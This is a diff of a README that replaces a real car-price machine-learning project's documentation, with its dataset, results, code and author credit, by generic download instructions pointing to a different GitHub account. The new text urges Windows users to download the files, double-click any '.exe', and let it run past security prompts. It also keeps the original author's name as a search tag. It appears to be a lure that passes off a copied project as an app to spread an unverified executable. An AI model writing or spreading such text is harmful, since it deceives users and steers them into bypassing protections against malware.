@@ -1,237 +1,184 @@
-<h1 align="center">🚗 Pre-Owned Vehicle Price Estimation 🚗</h1>
-<h3 align="center">With Random Forest Regression</h3>
+# 🚗 Car-Resale-Price-Predictor-RandomForest - Estimate Used Car Value Fast
 
-<p align="center">
-  <img src="images/CarPriceProject.gif" alt="Car Price Prediction" width="800"/>
-</p>
+[![Download the app](https://img.shields.io/badge/Download%20Now-Blue%20%26%20Grey-blue?style=for-the-badge)](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python" />
-  <img src="https://img.shields.io/badge/Scikit--Learn-ML-orange?style=for-the-badge&logo=scikit-learn" />
-  <img src="https://img.shields.io/badge/Random%20Forest-Regressor-green?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/R²%20Score-94%25-brightgreen?style=for-the-badge" />
-</p>
+## 🖥️ What This App Does
 
----
+Car-Resale-Price-Predictor-RandomForest helps you check the resale price of a used car based on a few details, such as:
 
-## 📌 Project Overview
+- Engine size
+- Mileage
+- Max power
+- Fuel type
+- Vehicle age
+- Transmission type
 
-With thousands of used cars listed on platforms like **CarDekho**, it's difficult for sellers to know the right asking price. Pricing too high means no buyers; pricing too low means losing money.
+It uses a Random Forest Regression model trained on more than 15,000 CarDekho listings. The model is built to give a clear price estimate from simple car details.
 
-This project builds a **Random Forest Regression model** that predicts the **resale price of a pre-owned vehicle** based on key features like engine size, max power, mileage, fuel type, and more — giving sellers a data-driven price suggestion based on real market conditions.
+## 📦 What You Need
 
----
+Before you run the app on Windows, make sure you have:
 
-## 📁 Repository Structure
+- A Windows 10 or Windows 11 PC
+- Internet access for the first download
+- Enough free space to save the app files
+- A modern web browser if the app opens in one
 
-```
-Resale-Car-Price-Prediction/
-├── images/
-│   ├── selling_price_distribution.png
-│   ├── correlation_heatmap.png
-│   └── model_comparison.png
-│
-├── Resale_Car_Prediction.ipynb
-├── cardekho_imputated.csv
-├── car_price_predictor.pkl
-├── preprocessor.pkl
-├── .gitignore
-└── README.md
-```
+If the app comes as a folder or file in the repository, you will need to download it from the link above and keep the files together in one place.
 
----
+## ⬇️ Download the App
 
-## 🛠️ Libraries Used
+Use this link to visit the download page and get the files:
 
-- `scikit-learn`
-- `pandas`
-- `numpy`
-- `matplotlib`
-- `seaborn`
-- `joblib`
+[Go to the download page](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest)
 
----
+After the page opens:
 
-## 📊 Dataset
+1. Look for the green Code button or any release file.
+2. Download the repository as a ZIP file, or download the app file if one is listed.
+3. Save it to your Desktop or Downloads folder.
+4. If it is a ZIP file, right-click it and choose Extract All.
 
-The dataset is scraped from [cardekho.com](https://www.cardekho.com)
+## 🪟 Run It on Windows
 
-- **Samples:** 15,411
-- **Features:** 13
-- **Target Variable:** `selling_price` — resale price in INR
+After you download and extract the files, follow these steps:
 
-| Feature | Description |
-|---|---|
-| `model` | Car model name |
-| `vehicle_age` | Age of the vehicle (in years) |
-| `km_driven` | Total kilometers driven |
-| `seller_type` | Individual / Dealer / Trustmark Dealer |
-| `fuel_type` | Petrol / Diesel / CNG / LPG |
-| `transmission_type` | Manual / Automatic |
-| `mileage` | Fuel efficiency (km/l) |
-| `engine` | Engine displacement (cc) |
-| `max_power` | Maximum power (bhp) |
-| `seats` | Number of seats |
+1. Open the folder you just extracted.
+2. Look for the main app file.
+3. If you see a file with `.exe`, double-click it.
+4. If you see a Python file like `app.py` or `main.py`, open it from the project folder with the required Python setup.
+5. Wait for the app window or browser page to open.
+6. Enter the car details when asked.
+7. Click the button to get the resale price estimate.
 
----
+If Windows shows a security prompt, choose the option that lets the app run.
 
-## ⚙️ Workflow
+## 🧭 How to Use the App
 
-1. Load the dataset from `cardekho_imputated.csv`
-2. Check for missing values — dataset is pre-imputed, no nulls found
-3. Drop irrelevant features — `car_name` and `brand` (redundant with `model`)
-4. Identify feature types — 7 numerical, 4 categorical
-5. Exploratory Data Analysis — price distribution and correlation heatmap
-6. Apply **Label Encoding** on `model` column (120 unique values)
-7. Train-Test Split — 80% train / 20% test (`random_state=42`)
-8. Preprocessing — `OneHotEncoder` for categorical, `StandardScaler` for numerical via `ColumnTransformer`
-9. Train and compare 6 models — Linear Regression, Lasso, Ridge, KNN, Decision Tree, Random Forest
-10. Hyperparameter tuning using `RandomizedSearchCV` with 100 iterations and 3-fold CV
-11. Evaluate using RMSE, MAE, and R² Score
-12. Save model and preprocessor using `joblib`
+Use the form one field at a time:
 
----
+1. Enter the car brand and model if the app asks for them.
+2. Type the year or age of the car.
+3. Add the fuel type.
+4. Add the transmission type.
+5. Enter mileage.
+6. Enter engine size.
+7. Enter max power.
+8. Submit the form to see the estimate.
 
-## 📈 Exploratory Data Analysis
+For best results, use the details from the car’s registration card, service records, or listing page.
 
-<p align="center">
-  <img src="images/selling_price_distribution.png" alt="Selling Price Distribution" width="48%"/>
-  &nbsp;
-  <img src="images/correlation_heatmap.png" alt="Correlation Heatmap" width="48%"/>
-</p>
+## 📋 Example Input
 
-**Key Insights:**
-- Most cars are priced between ₹2–15 lakhs — heavily right-skewed distribution
-- `max_power` has the strongest positive correlation with selling price (0.75)
-- `engine` is the second strongest predictor (0.59)
-- `vehicle_age` and `km_driven` show negative correlation with price as expected
-- `mileage` negatively correlates with engine size — bigger engines are less fuel efficient
+You may see fields like these:
 
----
+- Fuel Type: Petrol
+- Transmission: Manual
+- Mileage: 20 kmpl
+- Engine: 1197 cc
+- Max Power: 82 bhp
+- Year: 2018
+- Kilometers Driven: 45,000
 
-## 🤖 Model Comparison
+The app then gives a price estimate based on the trained model.
 
-<p align="center">
-  <img src="images/model_comparison.png" alt="Model Comparison" width="80%"/>
-</p>
+## 🔍 How the Model Works
 
-| Model | Train R² | Test R² |
-|---|---|---|
-| Linear Regression | 0.6218 | 0.6645 |
-| Lasso | 0.6218 | 0.6645 |
-| Ridge | 0.6218 | 0.6645 |
-| K-Neighbors Regressor | 0.8691 | 0.9150 |
-| Decision Tree | 0.9995 | 0.8823 |
-| **Random Forest** | **0.9791** | **0.9303** |
+The app uses Random Forest Regression. This model looks at many decision paths at the same time and combines the results into one estimate.
 
-Random Forest was selected as the final model — best test R² with no overfitting.
+It was trained on cleaned CarDekho data with:
 
----
+- Data cleaning
+- Feature selection
+- Exploratory data analysis
+- Hyperparameter tuning
+- Regression testing with scikit-learn
 
-## 🔧 Hyperparameter Tuning
+This helps the model learn how car features connect to resale value.
 
-```python
-rf_params = {
-    "max_depth"        : [5, 8, 15, None, 10],
-    "max_features"     : [5, 7, "sqrt", 8],
-    "min_samples_split": [2, 8, 15, 20],
-    "n_estimators"     : [100, 200, 500, 1000]
-}
-```
+## 📁 Project Files
 
-Tuning method: `RandomizedSearchCV` — `n_iter=100`, `cv=3`, `n_jobs=-1`
+The repository may include files such as:
 
-**Best Parameters:**
-```python
-RandomForestRegressor(
-    n_estimators=1000,
-    min_samples_split=2,
-    max_features=7,
-    max_depth=None
-)
-```
+- `app.py` or `main.py` for the main app
+- `model.pkl` or `joblib` file for the saved model
+- `requirements.txt` for Python package setup
+- `README.md` for project details
+- notebooks for data cleaning and model work
 
----
+Keep the files in the same folder if the app depends on them.
 
-## 📉 Final Model Results
+## ⚙️ Basic Setup on Windows
 
-| Metric | Train | Test |
-|---|---|---|
-| R² Score | 0.9804 | 0.9403 |
-| RMSE | ₹1,26,209 | ₹2,12,015 |
-| MAE | ₹38,890 | ₹98,050 |
+If the app needs Python, install it first:
 
----
+1. Download Python from the official Python website.
+2. During install, check Add Python to PATH.
+3. Open Command Prompt.
+4. Go to the project folder with the `cd` command.
+5. Install the needed packages with the package list file, if included.
+6. Start the app file.
 
-## 🧪 Sample Prediction
+A typical setup can include:
 
-```python
-import joblib
-import pandas as pd
+- Python
+- pandas
+- numpy
+- scikit-learn
+- joblib
+- seaborn
+- matplotlib
 
-rf_model = joblib.load('car_price_predictor.pkl')
-preprocessor = joblib.load('preprocessor.pkl')
+## 🧪 What Affects the Price Estimate
 
-# Sample car — Ford Ecosport
-sample = pd.DataFrame([{
-    'model'            : 38,        # label encoded value for Ecosport
-    'vehicle_age'      : 6,
-    'km_driven'        : 30000,
-    'seller_type'      : 'Dealer',
-    'fuel_type'        : 'Diesel',
-    'transmission_type': 'Manual',
-    'mileage'          : 22.77,
-    'engine'           : 1498,
-    'max_power'        : 98.59,
-    'seats'            : 5
-}])
+The model uses features that often change used car value:
 
-sample_transformed = preprocessor.transform(sample)
-predicted_price = rf_model.predict(sample_transformed)
-print(f"Predicted Selling Price: ₹ {predicted_price[0]:,.0f}")
-# Output: Predicted Selling Price: ₹ 6,08,500
-```
+- Brand and model
+- Year
+- Fuel type
+- Transmission
+- Engine size
+- Mileage
+- Max power
+- Number of owners
+- Kilometers driven
 
----
+Cars with lower mileage, newer model years, and stronger engine power often get higher estimates, while older cars with high mileage often get lower ones.
 
-## 🚀 How to Run
+## 🔐 Data Source
 
-**1. Clone the repo**
-```bash
-git clone https://github.com/AnmolPatel20/Resale-Car-Price-Prediction.git
-cd Resale-Car-Price-Prediction
-```
+This project uses CarDekho listing data. The dataset contains more than 15,000 entries and reflects real used car market patterns.
 
-**2. Install dependencies**
-```bash
-pip install pandas numpy matplotlib seaborn scikit-learn joblib
-```
+That gives the model a wide base for price estimation across many car types and conditions.
 
-**3. Run the notebook**
-```bash
-jupyter notebook Resale_Car_Prediction.ipynb
-```
+## 📌 Common Use Cases
 
----
+People may use this app to:
 
-## 📌 Notes
-- Both `car_price_predictor.pkl` and `preprocessor.pkl` must be loaded together for prediction
-- The preprocessor handles all encoding and scaling — never pass raw data directly to the model
-- The `model` column requires the label encoded integer value, not the string name
+- Check a used car price before buying
+- Compare a seller’s asking price with an estimate
+- Review a listing before negotiation
+- Get a quick market range for a vehicle
 
----
+## 🛠️ If the App Does Not Open
 
-## 🙋 About
-I'm on my machine learning journey — building, experimenting and documenting as I go. Every notebook here represents something I've genuinely tried to understand, not just run. 🚀
+Try these steps:
 
-- GitHub: [@AnmolPatel20](https://github.com/AnmolPatel20)
-- Portfolio: [anmolpatel20.github.io/Anmol_Portfolio](https://anmolpatel20.github.io/Anmol_Portfolio/)
+1. Check that all files are still in the same folder.
+2. Make sure the ZIP file was fully extracted.
+3. Run the app again from the extracted folder.
+4. If the app uses Python, confirm Python is installed.
+5. Make sure any model file is present in the project folder.
+6. Close and reopen the app if it freezes on launch.
 
-## 🙏 Acknowledgements
-Thanks to **Krish Naik Sir** whose Udemy course has been a great resource throughout this learning journey.
+If the app opens in a browser, refresh the page and try again.
 
-*"Not all those who wander are lost." — J.R.R. Tolkien*
+## 📥 Download Again
 
----
+If you need the files again, use this link:
 
-<p align="center">⭐ Star this repo if you found it helpful!</p>
+[Download from GitHub](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest)
+
+## 🧩 Useful Search Tags
+
+anmol-patel, car-resale-price-prediction, cardekho, data-cleaning, data-science, exploratory-data-analysis, hyperparameter-tuning, joblib, machine-learning, python, random-forest, random-forest-regression, regression, scikit-learn, seaborn
